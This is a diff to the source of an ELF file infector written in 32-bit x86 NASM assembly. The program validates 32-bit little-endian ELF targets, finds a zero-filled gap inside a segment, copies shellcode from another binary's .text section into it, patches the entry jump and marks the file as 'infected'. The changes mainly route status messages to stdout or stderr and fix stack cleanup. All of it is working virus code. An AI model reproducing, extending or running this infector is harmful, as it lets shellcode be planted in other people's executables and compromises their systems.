@@ -22,9 +22,9 @@ STRUC Elf32_Ehdr
 	e_shentsize:	resw	1
 	e_shnum		resw	1
 	e_shstrndx:	resw	1
-ENDSTRUC
+	ENDSTRUC
 
-STRUC Elf32_Shdr
+	STRUC Elf32_Shdr
 	sh_name		resd	1
 	sh_type		resd	1
 	sh_flags	resd	1
@@ -35,9 +35,9 @@ STRUC Elf32_Shdr
 	sh_info		resd	1
 	sh_addralign	resd	1
 	sh_entsize	resd	1
-ENDSTRUC
+	ENDSTRUC
 
-STRUC Elf32_Phdr
+	STRUC Elf32_Phdr
 	p_type		resd	1
 	p_offset	resd	1
 	p_vaddr		resd	1
@@ -46,9 +46,9 @@ STRUC Elf32_Phdr
 	p_memsz		resd	1
 	p_flags		resd	1
 	p_align		resd	1
-ENDSTRUC
+	ENDSTRUC
 
-section .bss
+	section .bss
 	pivot_name:	resd 	1	; pivot file's name
 	pivot_fd:	resd 	1
 	pivot_size:	resd 	1
@@ -61,13 +61,14 @@ section .bss
 	shellcode:	resd 	1	; shellcode address is memorry
 	shellcode_size:	resd 	1
 
-section .text
+	section .text
 	global _start
 
-_start:
+	_start:
 	cmp dword[esp], 3 		; argc
 	je good_arg_count
 
+	push STDERR
 	push usage
 	push usage_len
 	call print
@@ -101,6 +102,7 @@ next_open:
 	jns getting_sizes
 
 open_err:
+	push STDERR
 	push bad_open
 	push bad_open_len
 	call print			; "couldn't open file!" ; TODO: might make it "$FILE couldn't be opened"
@@ -140,6 +142,7 @@ file_size_err:
 	js failed_fstat
 
 an_empty_file:
+	push STDERR
 	push empty_file
 	push empty_file_len
 	call print			; "empty file!"
@@ -215,6 +218,7 @@ checking_infection:
 
 	;; printing "$FILE_NAME is already infected"
 	; printing the file name
+	push STDERR
 	mov eax, [pivot_name]
 	push eax
 	call strlen
@@ -222,6 +226,7 @@ checking_infection:
 	call print
 
 	; print the rest of the string
+	push STDERR
 	push infected
 	push infected_len
 	call print
@@ -253,7 +258,7 @@ patching:
 	add eax, e_entry
 	push dword[eax]
 
-	call patch_jump_point		
+	call patch_jump_point
 	test eax, eax			; was the marker found and replaced ?
 	jns segments
 
@@ -313,6 +318,7 @@ next2:
 	push dword[shellcode_size]
 	call copy_data
 
+	push STDOUT
 	push shell_copied
 	push shell_copied_len
 	call print			; "copying shell .."
@@ -338,6 +344,7 @@ next2:
 	;;
 
 leaving_mark:
+	push STDOUT
 	push marking
 	push marking_len
 	call print			;"leaving a mark ..."
@@ -350,12 +357,14 @@ leaving_mark:
 	push eax
 	call copy_data
 
+	push STDOUT
 	mov eax, [pivot_name]
 	push eax
 	call strlen
 	push eax
 	call print
 
+	push STDOUT
 	push enjoy
 	push enjoy_len
 	call print			; "file has been infected"
@@ -444,10 +453,11 @@ mmap:	; void *mmap(DWORD size, int flags, int fd);
 
 mapping_error:
 	mov eax, -1
+	push STDERR
 	push bad_mmap
 	push bad_mmap_len
 	call print
-	add esp, 8
+	add esp, 0xc
 
 ret_mmap:
 	;; restoring used registers
@@ -538,7 +548,7 @@ method2:	; checking the in-segment 0-blocks
 
 	mov ebx, [ebx + p_offset]
 	add ebx, [ebp + 0x10]		; segment data in memorry
-	
+
 	mov ecx, -1			; the loop counter
 
 	mov edx, [ebp + 0x10]
@@ -568,18 +578,20 @@ reset_counter:
 	jmp parsing_data
 
 no_gap:
+	push STDERR
 	push no_gap_found
 	push no_gap_found_len
 	call print
 	xor eax, eax	 		; gap = NULL
-	add esp, 8
+	add esp, 0xc
 	jmp ret_gap
 
 found_gap:
+	push STDOUT
 	push gap_found
 	push gap_found_len
 	call print
-	add esp, 8
+	add esp, 0xc
 
 ret_gap:
 	; eax has the right return value, we just have to return
@@ -617,10 +629,11 @@ marker_loop:	; will be searching from the end to start as that is where the mark
 	jns marker_loop 		; buff[0] is a valid DWORD as well
 
 no_mark_found:
+	push STDERR
 	push no_marker
 	push no_marker_len
 	call print
-	add esp, 8
+	add esp, 0xc
 	mov eax, -1			; returns FALSE
 	jmp ret_patch
 
@@ -642,10 +655,6 @@ ret_patch:
 find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
 	push ebp
 	mov ebp, esp
-	sub esp, 0x4
-	; one variable here
-	;[ebp - 2] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
-	;2 bytes for alignements
 
 	;saving registers
 	push ebx
@@ -675,13 +684,12 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	add edx, ebx			; from now on, edx will have the pointer to the string index table, 
 					; we're gonna use this later
 
-	;;taking care of the section_count variable (@ ebp - 0xc)
-	mov ax, [ebx + e_shnum]
-	mov word[ebp - 2], ax
 
 	; parsing the sections and returning the address of .text
-	xor ecx, ecx
-	push target_section		; argument to strcmp
+	mov cx, [ebx + e_shnum]
+	movzx ecx, cx
+
+	push target_section		; the first argument argument to strcmp
 
 parsing_loop:
 	;get the sh_name and add it to edx (the string table section)
@@ -695,14 +703,13 @@ parsing_loop:
 	je found_text_section
 	;; section ++
 	add edi, Elf32_Shdr_size
-	;;
 
-	inc ecx
-	cmp cx, word[ebp - 2] 		; e_shnum
+	dec ecx
 	jne parsing_loop
 
 no_text_section:
 	xor eax, eax 			; text = NULL
+	push STDERR
 	push no_text
 	push no_text_len
 	call print
@@ -720,7 +727,7 @@ found_text_section:;
 	mov ecx, [edi + sh_size]
 	mov [ebx], ecx
 	;
-	add esp, 0x8
+	add esp, 0x4
 
 ret_text_section:
 	;restoring registers
@@ -785,7 +792,7 @@ get_file_size:	; size_t get_file_size(int fd);
 	push ebp
 	mov ebp, esp
 	; saving registers
-	push ebx 
+	push ebx
 	push ecx
 	; reserving space for stat structure in the stack
 	sub esp, stat_size
@@ -802,11 +809,12 @@ get_file_size:	; size_t get_file_size(int fd);
 	test eax, eax
 	jns ret_size
 
+	push STDERR
 	push bad_stat
 	push bad_stat_len
 	call print			; "couldn't stat file!"
 	mov eax, -1
-	add esp, 8
+	add esp, 0xc
 
 ret_size:
 	;restoring registers
@@ -818,7 +826,7 @@ ret_size:
 
 
 
-print: ; void print(char *buf, size_t len);
+print: ; void print(int fd, char *buf, size_t len);
 	push ebp
 	mov ebp, esp
 	; saving used resgiters
@@ -828,7 +836,7 @@ print: ; void print(char *buf, size_t len);
 	push edx
 	; performing the syscall
 	mov eax, 4
-	mov ebx, 1
+	mov ebx, [ebp + 0x10]
 	mov ecx, [ebp + 0xc]
 	mov edx, [ebp + 0x8]
 	int 0x80
@@ -880,11 +888,13 @@ is_target_elf: 	; int is_target_elf(void *data);
 	cmp dword[eax], 0x464c457f 	; '\x7f' + "ELF"
 	je good_elf_ptr
 
+	push STDERR
 	push bad_elf
 	push bad_elf_len
 	call print
+
 	mov eax, -1
-	add esp, 8
+	add esp, 0xc
 	jmp ret_arch
 
 good_elf_ptr:
@@ -892,10 +902,12 @@ good_elf_ptr:
 	cmp byte[eax], ELFCLASS32
 	je is_32_bit
 
+	push STDERR
 	push bad_32_bit_elf
 	push bad_32_bit_elf_len
 	call print			; "file is not 32 bit"
-	add esp, 8
+
+	add esp, 0xc
 	mov eax, -1			; the return value
 	jmp ret_arch
 
@@ -907,10 +919,11 @@ is_32_bit:
 	jmp ret_arch
 
 bad_little_endian:
+	push STDERR
 	push bad_l_endian
 	push bad_l_endian_len
 	call print
-	add esp, 8
+	add esp, 0xc
 	mov eax, -1			; the return value
 
 ret_arch:
